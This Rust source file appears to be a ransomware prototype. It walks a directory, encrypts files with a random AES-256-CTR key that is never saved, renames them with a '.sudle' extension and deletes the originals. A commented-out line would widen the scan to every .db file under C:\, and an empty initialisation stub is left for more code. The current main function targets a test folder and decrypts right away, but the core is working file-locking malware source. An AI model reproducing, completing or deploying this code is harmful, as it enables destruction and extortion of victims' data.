use aes::Aes256;
use cipher::{KeyIvInit, StreamCipher};
use ctr::Ctr128BE;
use dirs;
use rand::{thread_rng, Rng};
use std::{
    fs::{self, File},
    io::{Read, Write},
};
use walkdir::WalkDir;

// Type alias for AES-256 in CTR mode
type Aes256Ctr = Ctr128BE<Aes256>;

fn main() {
    initiailize_process();
    let key: [u8; 32] = generate_random_key();
    //let paths = search_db_files("C:\\");
    let home = dirs::home_dir().unwrap();
    let full = format!("{home}/projects/sudle/test_files", home = home.display());
    let paths = search_txt_files(&full);
    for file_path in paths {
        let file_new_path = remove_suffix(&file_path, ".txt");
        let output_file_path = format!("{}.sudle", file_new_path);
        match encrypt_decrypt(&file_path, &key, false) {
            Ok(path) => {
                match encrypt_decrypt(path.as_str(), &key, true){
                    Ok(file_path) => println!("{} processed successfully", file_path),
                    Err(e) => println!("Error processing {}: {:?}", file_path, e),
                }
            }
            Err(e) => println!("Error processing {}: {:?}", file_path, e),
        }
    }
}

fn initiailize_process() {
    // Add your code here
}

fn generate_random_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    thread_rng().fill(&mut key);
    key
}
fn search_db_files(start_path: &str) -> Vec<String> {
    let mut paths = vec![];
    for entry in WalkDir::new(start_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "db"))
    {
        if let Some(path) = entry.path().to_str() {
            paths.push(path.to_string());
        }
    }
    paths
}

fn search_txt_files(start_path: &str) -> Vec<String> {
    let mut paths = vec![];
    for entry in WalkDir::new(start_path)
        .max_depth(1)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "txt"))
    {
        paths.push(entry.path().to_str().unwrap().to_string());
    }
    paths
}

fn encrypt_decrypt(
    input_file_path: &str,
    key: &[u8; 32],
    decrypt: bool,
) -> Result<String, String> {
    // Open the input file and read its contents
    let mut input_file = File::open(input_file_path).expect("could not open file");
    let mut contents = Vec::new();
    input_file.read_to_end(&mut contents).expect("could not read file");

    // Determine the output file path based on the operation
    let output_file_path = if decrypt {
        remove_suffix(input_file_path, ".sudle")
    } else {
        input_file_path.to_string() + ".sudle"
    };

    let mut nonce = [0u8; 16];
    let contents_to_process;

    if decrypt {
        // For decryption, read the nonce from the start of the file
        nonce.copy_from_slice(&contents[0..16]);
        contents_to_process = &contents[16..];
    } else {
        // For encryption, generate a random nonce
        thread_rng().fill(&mut nonce);
        contents_to_process = &contents[..];
    }

    // Create the cipher instance
    let mut cipher = Aes256Ctr::new_from_slices(key, &nonce).unwrap();

    // Process the contents in place
    let mut buffer = contents_to_process.to_vec();
    cipher.apply_keystream(&mut buffer);

    // Open the output file and write the processed contents
    let mut output_file = File::create(&output_file_path).expect("could not create file");
    if !decrypt {
        // Write the nonce before the encrypted contents only during encryption
        output_file.write_all(&nonce).expect("could not write nonce");
    }
    output_file.write_all(&buffer).expect("could not write processed file");

    // Optionally, remove the original file
    fs::remove_file(input_file_path).expect("could not delete original file");

    Ok(output_file_path)
}



fn remove_suffix(input: &str, suffix: &str) -> String {
    if input.ends_with(suffix) {
        // Trim the suffix from the input string
        input[..input.len() - suffix.len()].to_string()
    } else {
        // If the input doesn't end with the suffix, return the original input
        input.to_string()
    }
}